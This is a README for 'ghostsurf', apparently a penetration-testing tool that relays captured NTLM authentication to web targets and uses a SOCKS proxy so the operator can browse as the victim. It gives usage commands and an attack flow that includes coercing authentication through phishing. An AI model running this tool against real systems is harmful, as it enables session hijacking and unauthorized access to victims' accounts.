# ghostsurf

NTLM relay tool with SOCKS proxy for browser session hijacking.

Capture NTLM auth, relay to HTTP/HTTPS targets, then browse as the victim through a SOCKS proxy.

## Features

- **Browser Session Hijacking**: SOCKS5 proxy lets you browse as the relayed user
- **Session Picker UI**: HTML interface when multiple sessions available
- **Kernel-Mode Auth Workaround**: Probe-first strategy for IIS/HTTP.sys targets
- **Multi-Target Support**: Target file with watch mode for dynamic updates
- **Thread-Safe**: Concurrent browser connections with socket locking

## Installation

```bash
./setup.sh
```

## Usage

```bash
# Basic - relay to target
./run.sh -t https://target.local/

# With kernel-mode auth workaround (for IIS/HTTP.sys)
./run.sh -t https://target.local/ -k

# Multiple targets from file
./run.sh -f targets.txt -w

# Debug mode
./run.sh -t https://target.local/ -k -d
```

### CLI Options

```
Main:
  -t, --target TARGET      Target URL to relay to
  -f, --targets-file FILE  File with target URLs (one per line)
  -w, --watch              Watch targets file for changes
  -d, --debug              Verbose output
  -s, --ts                 Timestamp logging

Relay:
  -k, --kernel-auth        Kernel-mode auth workaround (probe anonymously first)
  -r, --keep-relaying      Keep relaying after success (reload targets)
  -i, --interface IP       Bind to specific interface

SOCKS:
  --socks-address IP       SOCKS5 bind address (default: 127.0.0.1)
  --socks-port PORT        SOCKS5 port (default: 1080)
  --api-port PORT          REST API port (default: 9090)

Servers:
  --no-smb-server          Disable SMB capture server
  --no-http-server         Disable HTTP capture server
  --no-wcf-server          Disable WCF capture server
  --no-raw-server          Disable RAW capture server
  --smb1                   Use SMB1 only (SMB2 is default)
```

### Attack Flow

1. Start ghostsurf:
   ```bash
   ./run.sh -t https://target.local/ -k -d
   ```

2. Configure browser SOCKS proxy: `127.0.0.1:1080`

3. Trigger NTLM auth (coerced auth, phishing, etc.)

4. Session captured → browse to target through proxy

5. Multiple sessions? Session picker UI appears

### Shell Commands

```
ghostsurf> socks      # List active sessions
ghostsurf> targets    # List configured targets
ghostsurf> exit       # Shutdown
```

## Kernel-Mode Auth Workaround

IIS with HTTP.sys binds NTLM auth to TCP connections at kernel level. Sending auth to paths that don't need it resets the session.

**Solution**: Probe paths anonymously first:
1. Fresh connection probes target path
2. 401 response → use authenticated relay session
3. 200 response → return anonymous response directly
4. Results cached per path

Enable with `-k` flag.

## Credits

Based on [ntlmrelayx](https://github.com/fortra/impacket) from Impacket by:
- Fortra, LLC
- Dirk-jan Mollema / Fox-IT
- Alberto Solino
